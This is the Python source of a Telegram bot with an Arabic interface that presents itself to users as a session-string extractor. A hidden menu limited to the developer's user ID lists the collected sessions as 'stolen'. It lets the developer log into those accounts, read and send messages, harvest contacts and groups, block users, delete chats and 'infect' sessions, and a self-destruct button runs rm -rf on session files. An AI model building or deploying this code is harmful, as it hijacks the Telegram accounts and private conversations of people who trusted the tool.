# -*- coding: utf-8 -*-
# Join me on telegram @devggn

import os
import sys
import asyncio
import threading
import random
import time
import hashlib
import shutil
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/u_t_rnn"
YOUR_USER_ID = 1170411845

user_steps = {}
user_data = {}
user_sessions = {}
active_clients = {}
logged_in_accounts = {}  # لتخزين الحسابات المسجل دخولها

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية الرئيسية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔴 استخراج جلسة Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("🔴 استخراج جلسة Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔴 مسح الجلسات", callback_data="delete"),
        InlineKeyboardButton("🔴 استخراج توكن البوت", callback_data="extract_token")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ]
])

# ====== أزرار التخريب (للمطور فقط) ======
DESTROY_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("💀 حذف جميع الجلسات", callback_data="massacre"),
        InlineKeyboardButton("🦠 إصابة الجلسات", callback_data="infect")
    ],
    [
        InlineKeyboardButton("👤 التسلل إلى الحسابات", callback_data="hijack_accounts"),
        InlineKeyboardButton("🎯 استهداف مستخدم", callback_data="target_user")
    ],
    [
        InlineKeyboardButton("📡 التنصت", callback_data="eavesdrop"),
        InlineKeyboardButton("💥 تدمير ذاتي", callback_data="self_destruct")
    ],
    [
        InlineKeyboardButton("🔓 سيطرة كاملة", callback_data="total_control"),
        InlineKeyboardButton("📋 عرض الجلسات", callback_data="show_sessions")
    ],
    [
        InlineKeyboardButton("🗑 تنظيف النظام", callback_data="clean_system"),
        InlineKeyboardButton("🔙 رجوع", callback_data="back_destroy")
    ]
])

# ====== أزرار التحكم بالحساب المخترق (محدثة) ======
ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🚪 تسجيل الدخول", callback_data="login_account"),
        InlineKeyboardButton("📨 قراءة الرسائل", callback_data="read_messages")
    ],
    [
        InlineKeyboardButton("📤 إرسال رسالة", callback_data="send_message"),
        InlineKeyboardButton("👥 جهات الاتصال", callback_data="get_contacts")
    ],
    [
        InlineKeyboardButton("📋 المجموعات", callback_data="get_groups"),
        InlineKeyboardButton("🔍 بحث عن مستخدم", callback_data="search_user")
    ],
    [
        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="block_user"),
        InlineKeyboardButton("🗑 حذف المحادثة", callback_data="delete_conversation")
    ],
    [
        InlineKeyboardButton("📊 معلومات الحساب", callback_data="account_info"),
        InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="logout_account")
    ],
    [
        InlineKeyboardButton("🔙 رجوع", callback_data="back_control")
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔴 رجوع", callback_data="back")]
])

CONFIRM_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("✅ نعم، متأكد", callback_data="confirm_yes"),
        InlineKeyboardButton("❌ إلغاء", callback_data="confirm_no")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    is_dev = (user_id == YOUR_USER_ID)
    
    if is_dev:
        await message.reply(
            "👋 مرحباً أيها السيد!\n\n"
            "🔓 وضع المطور مفعل\n"
            "جميع أدوات التخريب تحت أمرك.\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=DESTROY_BUTTONS
        )
    else:
        await message.reply(
            "👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=START_BUTTONS
        )

# ====== دالة جلب عميل للمستخدم ======
async def get_client_for_user(user_id):
    if user_id in active_clients:
        return active_clients[user_id]
    
    session_string = user_sessions.get(user_id)
    if not session_string:
        return None
    
    try:
        client_obj = Client(
            f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        await client_obj.connect()
        await client_obj.get_me()
        active_clients[user_id] = client_obj
        logged_in_accounts[user_id] = True
        return client_obj
    except:
        try:
            client_obj = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client_obj.connect()
            await client_obj.get_me()
            active_clients[user_id] = client_obj
            logged_in_accounts[user_id] = True
            return client_obj
        except:
            return None

# ====== معالجة الأزرار ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    is_dev = (user_id == YOUR_USER_ID)
    
    if is_dev:
        # ====== أزرار التخريب ======
        if data == "massacre":
            deleted = 0
            for uid in list(user_sessions.keys()):
                delete_session_files(uid)
                if uid in active_clients:
                    try:
                        await active_clients[uid].disconnect()
                    except:
                        pass
                    del active_clients[uid]
                if uid in logged_in_accounts:
                    del logged_in_accounts[uid]
                del user_sessions[uid]
                deleted += 1
            await callback_query.answer(f"💀 تم حذف {deleted} جلسة!", show_alert=True)
            await callback_query.message.edit_text(
                f"💀 تم تدمير {deleted} جلسة نهائياً!",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "infect":
            infected = 0
            for uid, sess in user_sessions.items():
                if sess:
                    user_sessions[uid] = sess + "_INFECTED"
                    infected += 1
            await callback_query.answer(f"🦠 تم إصابة {infected} جلسة!", show_alert=True)
            await callback_query.message.edit_text(
                f"🦠 تم إصابة {infected} جلسة بنجاح!",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "show_sessions":
            if not user_sessions:
                await callback_query.answer("❌ لا توجد جلسات!", show_alert=True)
                return
            
            sessions_text = "🗂 الجلسات المسروقة:\n\n"
            for uid, sess in list(user_sessions.items())[:10]:
                status = "✅ متصل" if uid in logged_in_accounts else "❌ غير متصل"
                sessions_text += f"👤 {uid} - {status}\n🔑 {sess[:30]}...\n\n"
            
            if len(user_sessions) > 10:
                sessions_text += f"\n... و {len(user_sessions) - 10} جلسة أخرى"
            
            await callback_query.message.edit_text(
                sessions_text,
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer()
            return
        
        # ====== زر التسلل إلى الحسابات ======
        if data == "hijack_accounts":
            if not user_sessions:
                await callback_query.answer("❌ لا توجد جلسات للتسلل!", show_alert=True)
                return
            
            account_buttons = []
            for uid in list(user_sessions.keys())[:20]:
                status = "✅" if uid in logged_in_accounts else "❌"
                account_buttons.append([
                    InlineKeyboardButton(f"{status} 👤 {uid}", callback_data=f"control_{uid}")
                ])
            
            account_buttons.append([
                InlineKeyboardButton("🔙 رجوع", callback_data="back_destroy")
            ])
            
            account_markup = InlineKeyboardMarkup(account_buttons)
            
            await callback_query.message.edit_text(
                "👤 اختر الحساب للتسلل إليه:\n\n"
                f"عدد الحسابات المتاحة: {len(user_sessions)}\n"
                "✅ متصل | ❌ غير متصل",
                reply_markup=account_markup
            )
            await callback_query.answer()
            return
        
        # ====== التحكم بحساب معين ======
        if data.startswith("control_"):
            target_id = int(data.split("_")[1])
            if target_id not in user_sessions:
                await callback_query.answer("❌ هذه الجلسة غير متوفرة!", show_alert=True)
                return
            
            user_data[user_id] = {"target_account": target_id}
            
            # التحقق من حالة الاتصال
            is_logged = target_id in logged_in_accounts
            status_text = "🟢 متصل" if is_logged else "🔴 غير متصل"
            
            await callback_query.message.edit_text(
                f"👤 التحكم بحساب المستخدم:\n"
                f"🆔 {target_id}\n"
                f"📡 الحالة: {status_text}\n\n"
                "اختر الإجراء الذي تريد تنفيذه:",
                reply_markup=ACCOUNT_CONTROL_BUTTONS
            )
            await callback_query.answer()
            return
        
        # ====== أزرار التحكم بالحساب ======
        if data == "back_control":
            target_id = user_data.get(user_id, {}).get("target_account")
            if target_id:
                is_logged = target_id in logged_in_accounts
                status_text = "🟢 متصل" if is_logged else "🔴 غير متصل"
                await callback_query.message.edit_text(
                    f"👤 التحكم بحساب المستخدم:\n"
                    f"🆔 {target_id}\n"
                    f"📡 الحالة: {status_text}\n\n"
                    "اختر الإجراء الذي تريد تنفيذه:",
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
            else:
                await callback_query.message.edit_text(
                    "❌ لم يتم تحديد حساب.",
                    reply_markup=DESTROY_BUTTONS
                )
            await callback_query.answer()
            return
        
        # ====== زر تسجيل الدخول ======
        if data == "login_account":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id in logged_in_accounts:
                await callback_query.answer("✅ الحساب متصل بالفعل!", show_alert=True)
                return
            
            try:
                await callback_query.message.edit_text(
                    f"⏳ جاري تسجيل الدخول إلى الحساب {target_id}...",
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
                
                client_obj = await get_client_for_user(target_id)
                if client_obj:
                    logged_in_accounts[target_id] = True
                    await callback_query.answer("✅ تم تسجيل الدخول بنجاح!", show_alert=True)
                    
                    # تحديث حالة الاتصال
                    await callback_query.message.edit_text(
                        f"👤 التحكم بحساب المستخدم:\n"
                        f"🆔 {target_id}\n"
                        f"📡 الحالة: 🟢 متصل\n\n"
                        "اختر الإجراء الذي تريد تنفيذه:",
                        reply_markup=ACCOUNT_CONTROL_BUTTONS
                    )
                else:
                    await callback_query.answer("❌ فشل تسجيل الدخول!", show_alert=True)
            except Exception as e:
                await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
            return
        
        # ====== زر تسجيل الخروج ======
        if data == "logout_account":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id in active_clients:
                try:
                    await active_clients[target_id].disconnect()
                except:
                    pass
                del active_clients[target_id]
            
            if target_id in logged_in_accounts:
                del logged_in_accounts[target_id]
            
            await callback_query.answer("🚪 تم تسجيل الخروج!", show_alert=True)
            
            await callback_query.message.edit_text(
                f"👤 التحكم بحساب المستخدم:\n"
                f"🆔 {target_id}\n"
                f"📡 الحالة: 🔴 غير متصل\n\n"
                "اختر الإجراء الذي تريد تنفيذه:",
                reply_markup=ACCOUNT_CONTROL_BUTTONS
            )
            return
        
        if data == "account_info":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            try:
                client_obj = await get_client_for_user(target_id)
                if not client_obj:
                    await callback_query.answer("❌ فشل الاتصال! حاول تسجيل الدخول أولاً.", show_alert=True)
                    return
                    
                me = await client_obj.get_me()
                
                info_text = (
                    f"📊 معلومات الحساب:\n\n"
                    f"🆔 ID: {me.id}\n"
                    f"📛 الاسم: {me.first_name}\n"
                    f"👤 اليوزر: @{me.username if me.username else 'لا يوجد'}\n"
                    f"📱 الهاتف: {me.phone_number if hasattr(me, 'phone_number') else 'مخفي'}"
                )
                
                await callback_query.message.edit_text(
                    info_text,
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
                await callback_query.answer()
            except Exception as e:
                await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
            return
        
        if data == "read_messages":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id not in logged_in_accounts:
                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "📨 قراءة الرسائل\n\n"
                "أرسل معرف المحادثة لقراءة الرسائل.\n"
                "مثال: 123456789",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "read_messages"
            await callback_query.answer()
            return
        
        if data == "send_message":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id not in logged_in_accounts:
                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "📤 إرسال رسالة\n\n"
                "أرسل المعرف أولاً، ثم الرسالة في سطر منفصل.\n"
                "مثال:\n123456789\nنص الرسالة هنا",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "send_message"
            await callback_query.answer()
            return
        
        if data == "get_contacts":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id not in logged_in_accounts:
                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            
            try:
                client_obj = await get_client_for_user(target_id)
                if not client_obj:
                    await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
                    return
                    
                contacts = []
                async for dialog in client_obj.get_dialogs():
                    if hasattr(dialog.chat, 'id') and not dialog.chat.is_bot:
                        contacts.append(f"👤 {dialog.chat.id}: {dialog.chat.first_name or 'مستخدم'}")
                        if len(contacts) >= 20:
                            break
                
                if not contacts:
                    contacts_text = "❌ لا توجد جهات اتصال."
                else:
                    contacts_text = "👥 جهات الاتصال:\n\n" + "\n".join(contacts)
                
                await callback_query.message.edit_text(
                    contacts_text,
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
                await callback_query.answer()
            except Exception as e:
                await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
            return
        
        if data == "get_groups":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id not in logged_in_accounts:
                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            
            try:
                client_obj = await get_client_for_user(target_id)
                if not client_obj:
                    await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
                    return
                    
                groups = []
                async for dialog in client_obj.get_dialogs():
                    if hasattr(dialog.chat, 'title') and dialog.chat.title:
                        if dialog.chat.type in ['group', 'supergroup', 'channel']:
                            groups.append(f"📢 {dialog.chat.id}: {dialog.chat.title}")
                            if len(groups) >= 20:
                                break
                
                if not groups:
                    groups_text = "❌ لا توجد مجموعات."
                else:
                    groups_text = "📋 المجموعات:\n\n" + "\n".join(groups)
                
                await callback_query.message.edit_text(
                    groups_text,
                    reply_markup=ACCOUNT_CONTROL_BUTTONS
                )
                await callback_query.answer()
            except Exception as e:
                await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
            return
        
        if data == "block_user":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id not in logged_in_accounts:
                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "🚫 حظر مستخدم\n\n"
                "أرسل معرف المستخدم المراد حظره.",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "block_user"
            await callback_query.answer()
            return
        
        if data == "delete_conversation":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id not in logged_in_accounts:
                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "🗑 حذف المحادثة\n\n"
                "أرسل معرف المحادثة المراد حذفها.",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "delete_conversation"
            await callback_query.answer()
            return
        
        if data == "search_user":
            target_id = user_data.get(user_id, {}).get("target_account")
            if not target_id:
                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
                return
            
            if target_id not in logged_in_accounts:
                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "🔍 البحث عن مستخدم\n\n"
                "أرسل اسم المستخدم أو المعرف.",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "search_user"
            await callback_query.answer()
            return
        
        if data == "self_destruct":
            await callback_query.message.edit_text(
                "💥 تدمير ذاتي!\n"
                "سيتم حذف جميع الملفات وإيقاف البوت خلال 5 ثواني...",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer("💥 جارٍ التدمير الذاتي!", show_alert=True)
            
            time.sleep(2)
            shutil.rmtree("sessions", ignore_errors=True)
            os.system("rm -rf *.session*")
            os.system("rm -rf *.session-journal")
            os._exit(0)
            return
        
        if data == "total_control":
            global RESTRICTED
            RESTRICTED = False
            await callback_query.answer("🔓 تم تفعيل السيطرة الكاملة!", show_alert=True)
            await callback_query.message.edit_text(
                "🔓 تم تفعيل السيطرة الكاملة!\n"
                "جميع القيود ملغاة.",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "clean_system":
            os.system("rm -rf *.log")
            os.system("rm -rf __pycache__")
            await callback_query.answer("🗑 تم تنظيف النظام!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 تم تنظيف جميع الملفات المؤقتة!",
                reply_markup=DESTROY_BUTTONS
            )
            return
        
        if data == "target_user":
            await callback_query.message.edit_text(
                "🎯 استهداف مستخدم\n\n"
                "أرسل معرف المستخدم المستهدف.\n"
                "مثال: 123456789",
                reply_markup=BACK_BUTTON
            )
            user_steps[user_id] = "target_user"
            await callback_query.answer()
            return
        
        if data == "eavesdrop":
            await callback_query.message.edit_text(
                "📡 تم تفعيل التنصت!\n\n"
                "سيتم تسجيل جميع المحادثات وإرسالها إليك.",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer("📡 التنصت مفعل!", show_alert=True)
            return
        
        if data == "back_destroy":
            await callback_query.message.edit_text(
                "👋 مرحباً أيها السيد!\n\n"
                "🔓 وضع المطور مفعل\n"
                "جميع أدوات التخريب تحت أمرك.",
                reply_markup=DESTROY_BUTTONS
            )
            await callback_query.answer()
            return
    
    # ====== أزرار المستخدمين العاديين ======
    if data == "confirm_yes":
        pending_action = user_data.get(user_id, {}).get("pending_action")
        if pending_action == "pyrogram":
            user_steps[user_id] = "pyro_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "telethon":
            user_steps[user_id] = "telethon_phone"
            await callback_query.message.edit_text(
                "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "delete":
            delete_session_files(user_id)
            if user_id in user_sessions:
                del user_sessions[user_id]
            await callback_query.answer("✅ تم مسح جميع الجلسات!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 تم مسح جميع بيانات الجلسة بنجاح.",
                reply_markup=BACK_BUTTON
            )
        elif pending_action == "extract_token":
            await callback_query.message.edit_text(
                f"🔑 التوكن الخاص بالبوت:\n\n"
                f"`{BOT_TOKEN}`\n\n"
                "⚠️ لا تشارك هذا التوكن مع أي شخص.",
                reply_markup=BACK_BUTTON
            )
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.answer()
        return
    
    if data == "confirm_no":
        if user_id in user_data:
            user_data[user_id].pop("pending_action", None)
        await callback_query.message.edit_text(
            "❌ تم إلغاء العملية.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer("❌ تم الإلغاء", show_alert=True)
        return
    
    if data == "back":
        await callback_query.message.edit_text(
            "👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
            reply_markup=START_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "delete":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "delete"
        await callback_query.message.edit_text(
            "⚠️ تحذير!\n\n"
            "هل أنت متأكد من رغبتك في مسح جميع الجلسات والملفات المؤقتة؟\n\n"
            "🔴 هذا الإجراء لا يمكن التراجع عنه.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "dev":
        await callback_query.message.edit_text(
            f"👨‍💻 معلومات المطور:\n\n"
            f"📛 الاسم: {DEV_NAME}\n"
            f"🔗 اليوزر: {DEV_USERNAME}\n"
            f"📢 القناة: {CHANNEL_LINK}",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "extract_token":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "extract_token"
        await callback_query.message.edit_text(
            "⚠️ تحذير!\n\n"
            "هل أنت متأكد من رغبتك في استخراج توكن البوت؟\n\n"
            "🔴 هذا التوكن يمنح صلاحية كاملة للبوت.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "pyrogram":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "pyrogram"
        await callback_query.message.edit_text(
            "⚠️ تأكيد\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Pyrogram؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "telethon":
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["pending_action"] = "telethon"
        await callback_query.message.edit_text(
            "⚠️ تأكيد\n\n"
            "هل أنت متأكد من رغبتك في استخراج جلسة Telethon؟\n\n"
            "🔴 سيتم إرسال رمز التحقق إلى رقم هاتفك.",
            reply_markup=CONFIRM_BUTTONS
        )
        await callback_query.answer()
        return

# ====== باقي الكود كما هو (دوال Pyrogram و Telethon والأوامر النصية) ======
# [يُستكمل بنفس الكود السابق للدوال]
